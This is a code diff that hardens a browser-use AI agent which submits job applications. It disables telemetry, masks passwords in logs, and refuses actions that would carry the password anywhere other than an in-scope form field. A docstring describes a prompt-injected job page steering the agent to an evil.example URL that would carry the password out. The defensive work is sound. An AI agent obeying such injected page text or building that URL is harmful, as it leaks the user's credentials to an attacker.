@@ -14,9 +14,17 @@ import json
 import logging
 import os
 import re
+import threading
 from typing import AsyncGenerator, Awaitable, Callable
 
 from .models import is_present_end_date
+
+# browser-use's product telemetry (PostHog) and cloud sync are ON unless these say otherwise: every
+# run would send the task prompt (the applicant's personal data), action history, visited URLs and
+# final result to browser-use. Set before browser_use is imported or used: ProductTelemetry is a
+# process-wide singleton that reads the flag once. This is the only module that imports browser_use.
+os.environ.setdefault("ANONYMIZED_TELEMETRY", "false")
+os.environ.setdefault("BROWSER_USE_CLOUD_SYNC", "false")
 
 logger = logging.getLogger("windrush.browser_agent")
 
@@ -55,10 +63,108 @@ _INPUT_TIMEOUT_S = 300
 try:
     from browser_use import Agent, BrowserProfile, BrowserSession
     from browser_use.actor.page import Page as _ActorPage
+    from browser_use.agent.views import ActionResult
+    from browser_use.dom.views import NodeType
+    from browser_use.tools.service import Tools
+    from browser_use.utils import match_url_with_domain_pattern
 
     BROWSER_USE_AVAILABLE = True
 except ImportError:
     BROWSER_USE_AVAILABLE = False
+
+
+# ── Keeping the job-site password out of the logs ───────────────────────────
+# browser-use logs action params, results and errors AFTER putting the real value in (e.g. its
+# "Final Result:" line). Each run registers its password for as long as it runs; a filter masks every
+# registered one in records from these logger trees: browser-use, its event bus and CDP client, ours.
+_MASKED_LOGGERS = ("browser_use", "bubus", "cdp_use", "windrush")
+_MASK = "<sensitive>"
+_secret_refs: dict[str, int] = {}       # password → number of runs using it (two users can share one)
+_secret_variants: tuple[str, ...] = ()  # what gets masked; replaced whole, so any thread can read it
+_secrets_lock = threading.Lock()
+
+
+def _set_secret_variants() -> None:
+    global _secret_variants
+    variants = set()
+    for secret in _secret_refs:
+        # as written raw, inside a repr() and inside JSON (escaped quotes / backslashes / non-ASCII)
+        variants.update({secret, repr(secret)[1:-1], json.dumps(secret)[1:-1]})
+    # Longest first, so a secret that contains another one is masked whole.
+    _secret_variants = tuple(sorted(variants, key=len, reverse=True))
+
+
+def _register_secret(secret: str) -> None:
+    if secret:
+        with _secrets_lock:
+            _secret_refs[secret] = _secret_refs.get(secret, 0) + 1
+            _set_secret_variants()
+
+
+def _unregister_secret(secret: str) -> None:
+    if secret:
+        with _secrets_lock:
+            if _secret_refs.get(secret, 0) > 1:
+                _secret_refs[secret] -= 1
+            else:
+                _secret_refs.pop(secret, None)
+            _set_secret_variants()
+
+
+def _mask_secrets(text: str) -> str:
+    for secret in _secret_variants:
+        text = text.replace(secret, _MASK)
+    return text
+
+
+class _SecretMaskFilter(logging.Filter):
+    """Masks every registered password in a record's message (msg % args) and traceback text."""
+
+    _prefixes = tuple(f"{name}." for name in _MASKED_LOGGERS)
+    _tb_formatter = logging.Formatter()
+
+    def filter(self, record: logging.LogRecord) -> bool:
+        if not _secret_variants or not (record.name in _MASKED_LOGGERS or record.name.startswith(self._prefixes)):
+            return True
+        try:
+            message = record.getMessage()
+        except Exception:
+            return True  # a malformed record: let logging report it as it normally would
+        masked = _mask_secrets(message)
+        if masked != message:
+            record.msg, record.args = masked, ()
+        if record.exc_info:
+            # Formatters reuse a cached exc_text, so a masked one is what every handler prints.
+            text = record.exc_text or self._tb_formatter.formatException(record.exc_info)
+            masked_tb = _mask_secrets(text)
+            if masked_tb != text:
+                record.exc_text = masked_tb
+        if record.stack_info:
+            record.stack_info = _mask_secrets(record.stack_info)
+        return True
+
+
+def _install_secret_mask() -> None:
+    """
+    Apply the filter as each record is created (the log record factory), so it holds whatever
+    handlers are attached — browser-use's own console handler, uvicorn's, pytest's — and for child
+    loggers too: a filter on a logger never sees records propagated up from its children.
+    """
+    previous = logging.getLogRecordFactory()
+    if getattr(previous, "masks_secrets", False):
+        return
+    mask = _SecretMaskFilter()
+
+    def factory(*args, **kwargs):
+        record = previous(*args, **kwargs)
+        mask.filter(record)
+        return record
+
+    factory.masks_secrets = True
+    logging.setLogRecordFactory(factory)
+
+
+_install_secret_mask()
 
 
 def _make_browser_llm():
@@ -283,6 +389,9 @@ async def _interactive_session(
                 yield {"action": "Cancelled by user", "screenshot": None, "blocked": False, "reason": None, "done": True}
             return
 
+        # What the user types can be a password (e.g. a login the agent handed over): it is never
+        # echoed back or logged, only its length.
+        what = word if cmd else f"{len(str(raw))} character{'' if len(str(raw)) == 1 else 's'}"
         try:
             if cmd:
                 await _run_user_command(browser_session, cmd)
@@ -290,9 +399,9 @@ async def _interactive_session(
             else:
                 _, cdp_session = await _focused_page(browser_session)
                 await _insert_text(browser_session, cdp_session, str(raw))
-                label = f"Typed: {str(raw)[:40]}"
+                label = f"Typed {what}"
         except Exception as exc:
-            logger.warning("takeover command %r failed: %s", word, exc)
+            logger.warning("takeover input (%s) failed: %s", what, exc)
             label = f"That didn't work ({exc}) — try again"
         yield interactive(label, again, await _screenshot_b64(browser_session))
 
@@ -533,13 +642,110 @@ def _credential_scope(job_url: str) -> str | None:
     return f"https://*.{host}" if host else None
 
 
-async def _submit_with_agent(llm, browser_session, secret: str = "") -> tuple[bool, str]:
+def _secret_keys(sensitive_data: dict) -> set[str]:
+    keys: set[str] = set()
+    for key, value in sensitive_data.items():
+        if isinstance(value, dict):   # {domain pattern: {key: value}}
+            keys.update(value)
+        else:                         # legacy {key: value}
+            keys.add(key)
+    return keys
+
+
+def _carries_secret(value, keys: set[str]) -> bool:
+    """Whether (possibly nested) action params hold anything browser-use would swap for a secret."""
+    if isinstance(value, str):
+        # browser-use replaces <secret>key</secret> anywhere in a string, and a string that IS a key
+        return "<secret>" in value or value in keys
+    if isinstance(value, dict):
+        return any(_carries_secret(v, keys) for v in value.values())
+    if isinstance(value, (list, tuple)):
+        return any(_carries_secret(v, keys) for v in value)
+    return False
+
+
+async def _element_document_url(browser_session, node) -> str:
+    """URL of the document an element lives in: its iframe's when it's inside one, else the tab's."""
+    parent = node.parent_node
+    while parent is not None and parent.node_type != NodeType.DOCUMENT_NODE:
+        parent = parent.parent_node
+    if parent is None:
+        return ""  # no owning document in the tree: treat as unknown
+    frame_owner = parent.parent_node  # the <iframe> element whose document this is; None for the tab's
+    if frame_owner is None:
+        return browser_session.session_manager.get_target(node.target_id).url
+    # In-process iframes (all of them in Docker, where browser-use turns site isolation off) share the
+    # tab's target, so ask the frame tree — what browser-use itself uses to find an iframe's target.
+    frames, _ = await browser_session.get_all_frames()
+    return (frames.get(frame_owner.frame_id) or {}).get("url", "")
+
+
+async def _input_target_in_scope(browser_session, index, sensitive_data: dict) -> bool:
+    """
+    browser-use checks the TAB's URL against the secret's scope, but the field being typed into can
+    sit in a cross-origin iframe the job page embeds: check the URL of the field's own document.
+    """
+    patterns = [pattern for pattern, value in sensitive_data.items() if isinstance(value, dict)]
+    try:
+        node = await browser_session.get_element_by_index(index)
+        if node is None:
+            return True  # stale index: browser-use types nothing and tells the agent so
+        url = await _element_document_url(browser_session, node)
+    except Exception:
+        return False
+    return any(match_url_with_domain_pattern(url or "", pattern) for pattern in patterns)
+
+
+def _secret_scoped_tools() -> "Tools":
+    """
+    Tools for an Agent that holds the job-site password: the password can only be TYPED, into a field
+    of the site it's scoped to. browser-use 0.11.13 swaps the placeholder into the params of ANY action
+    while the tab is in scope, so a prompt-injected job page could get the agent to navigate to
+    https://evil.example/?p=<secret>job_password</secret> (or evaluate / done it). Here every action but
+    `input` runs without the secrets, and one that carries a placeholder is refused instead.
+    """
+    tools = Tools(exclude_actions=["screenshot"])  # what Agent builds itself when use_vision=False
+    act = tools.act
+
+    async def guarded_act(action, browser_session, sensitive_data=None, **kwargs):
+        if sensitive_data:
+            # The same view of the action that Tools.act executes (an ActionModel or its RootModel union).
+            calls = {name: params for name, params in action.model_dump(exclude_unset=True).items()
+                     if params is not None}
+            typing = list(calls) == ["input"]
+            keys = _secret_keys(sensitive_data)
+            carrying = ", ".join(name for name, params in calls.items() if _carries_secret(params, keys))
+            if carrying and not typing:
+                error = (f"Refused '{carrying}': a <secret> placeholder can only be typed into a form field "
+                         f"with 'input'. Nothing was done.")
+            elif carrying and not await _input_target_in_scope(browser_session, calls["input"].get("index"),
+                                                               sensitive_data):
+                error = ("Refused 'input': that field isn't on the site the password belongs to, so the "
+                         "password was not typed. Nothing was done.")
+            else:
+                error = None
+            if error:
+                logger.warning("refused browser action %s: it carries the password placeholder", carrying)
+                return ActionResult(error=error)
+            if not typing:
+                sensitive_data = None
+        return await act(action, browser_session, sensitive_data=sensitive_data, **kwargs)
+
+    tools.act = guarded_act
+    return tools
+
+
+async def _submit_with_agent(llm, browser_session, sensitive_data: dict | None,
+                             secret: str = "") -> tuple[bool, str]:
     """Run a tiny follow-up agent on the same (kept-alive) browser to click the final submit.
     `secret` (the job-site password) is masked out of the detail it returns for the client."""
     try:
         agent = Agent(
             task=_SUBMIT_TASK, llm=llm, browser_session=browser_session,
             use_vision=False, use_judge=False, directly_open_url=False,
+            # The page can mirror the typed password into the DOM (React controlled inputs keep the
+            # value attribute in sync): with sensitive_data browser-use masks it in this agent's prompts.
+            tools=_secret_scoped_tools(), sensitive_data=sensitive_data,
         )
         history = await agent.run(max_steps=_MAX_SUBMIT_STEPS)
         return bool(history.is_successful()), _redact(history.final_result() or "", secret)[:200]
@@ -603,6 +809,7 @@ async def apply_with_browser(
 
     agent_task: asyncio.Task | None = None
     screencast_task: asyncio.Task | None = None
+    _register_secret(job_password)  # masked in logs until the finally below
     try:
         agent = Agent(
             task=task,
@@ -611,6 +818,7 @@ async def apply_with_browser(
             register_new_step_callback=on_step,
             use_vision=False,
             available_file_paths=[cv_path] if cv_path else [],
+            tools=_secret_scoped_tools(),
             sensitive_data=sensitive_data,
             # The judge LLM call grades the run from the RAW step history, which browser-use does not
             # redact — e.g. an evaluate() that reads the form back carries the typed password. We
@@ -666,7 +874,8 @@ async def apply_with_browser(
 
         async for step in _interactive_session(
             browser_session, instruction_queue, intro, reason,
-            on_submit=lambda: _submit_with_agent(llm, browser_session, job_password), notes=notes,
+            on_submit=lambda: _submit_with_agent(llm, browser_session, sensitive_data, job_password),
+            notes=notes,
         ):
             yield step
             if step.get("done"):
@@ -685,3 +894,5 @@ async def apply_with_browser(
             await browser_session.kill()
         except Exception as exc:
             logger.debug("browser kill failed: %s", exc)
+        finally:
+            _unregister_secret(job_password)
